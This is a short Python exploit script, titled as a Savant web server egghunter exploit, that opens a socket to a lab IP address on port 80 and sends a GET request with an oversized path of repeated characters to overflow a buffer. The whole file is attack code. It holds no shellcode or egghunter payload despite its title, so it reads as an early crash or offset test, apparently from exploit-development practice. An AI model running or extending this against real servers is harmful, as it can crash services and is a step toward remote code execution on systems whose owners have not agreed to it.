#!/usr/bin/python
import socket
 
banner = """
#----------------------------------------------#
Savant Exploit - Egghunter
#----------------------------------------------#
"""

target_address="192.168.37.131"
target_port=80
 
badbuffer = "A"*254 + "B"*4
httpmethod = "GET"

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n'

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address, target_port))
sock.send(sendbuf)
sock.close()

